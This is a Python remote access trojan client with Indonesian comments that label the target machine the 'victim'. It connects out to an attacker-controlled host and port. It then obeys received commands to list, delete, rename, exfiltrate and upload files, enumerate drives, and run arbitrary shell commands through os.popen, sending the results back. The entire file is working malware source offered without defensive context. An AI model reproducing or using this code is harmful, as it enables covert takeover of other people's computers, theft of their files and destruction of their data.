import socket
import os
import string

HOST = '127.0.0.1'  # Ganti ke IP server
PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send(b"[INFO] Terhubung dari korban!")

print(f"[+] Connecting to {HOST}:{PORT}")
print("[+] Connected to server!")

def list_dir(path="."):
    try:
        files = os.listdir(path)
        output = []
        for f in files:
            full_path = os.path.join(path, f)
            ftype = "DIR" if os.path.isdir(full_path) else "FILE"
            output.append((f, ftype))
        return output
    except Exception as e:
        return [(f"[ERROR] {str(e)}", "ERROR")]

while True:
    try:
        command = s.recv(4096).decode().strip()
        if command == "exit":
            break

        elif command.startswith("cd "):
            try:
                path = command[3:]
                os.chdir(path)
                s.send(f"PATH: {os.getcwd()}".encode())
            except Exception as e:
                s.send(f"[ERROR] {e}".encode())

        elif command.startswith("ls"):
            path = command[3:].strip() or "."
            items = list_dir(path)
            s.send(f"LS: {items}".encode())

        elif command.startswith("delete "):
            filename = command[7:]
            try:
                if os.path.isdir(filename):
                    os.rmdir(filename)
                else:
                    os.remove(filename)
                s.send(b"[DELETED]")
            except Exception as e:
                s.send(f"[ERROR] {e}".encode())

        elif command.startswith("rename "):
            _, old, new = command.split(" ", 2)
            try:
                os.rename(old, new)
                s.send(b"[RENAMED]")
            except Exception as e:
                s.send(f"[ERROR] {e}".encode())

        elif command.startswith("download "):
            filename = command[9:]
            if not os.path.exists(filename):
                s.send(b"FILE_NOT_FOUND")
                continue
            with open(filename, "rb") as f:
                while chunk := f.read(1024):
                    s.send(chunk)
            s.send(b"EOF")

        elif command.startswith("upload "):
            filename = command[7:]
            s.send(b"READY")
            with open(filename, "wb") as f:
                while True:
                    chunk = s.recv(1024)
                    if b"EOF" in chunk:
                        f.write(chunk.replace(b"EOF", b""))
                        break
                    f.write(chunk)
            s.send(b"[UPLOADED]")

        elif command == "drives":
            try:
                from ctypes import windll
                drives = []
                bitmask = windll.kernel32.GetLogicalDrives()
                for letter in string.ascii_uppercase:
                    if bitmask & 1:
                        drives.append(f"{letter}:\\")
                    bitmask >>= 1
                s.send(f"DRIVES: {';'.join(drives)}".encode())
            except Exception as e:
                s.send(f"DRIVES_ERROR: {e}".encode())


        else:
            output = os.popen(command).read()
            s.send(output.encode() if output else b"[OK]")

    except Exception as e:
        try:
            s.send(f"[ERROR] {e}".encode())
        except:
            break
        break

s.close()
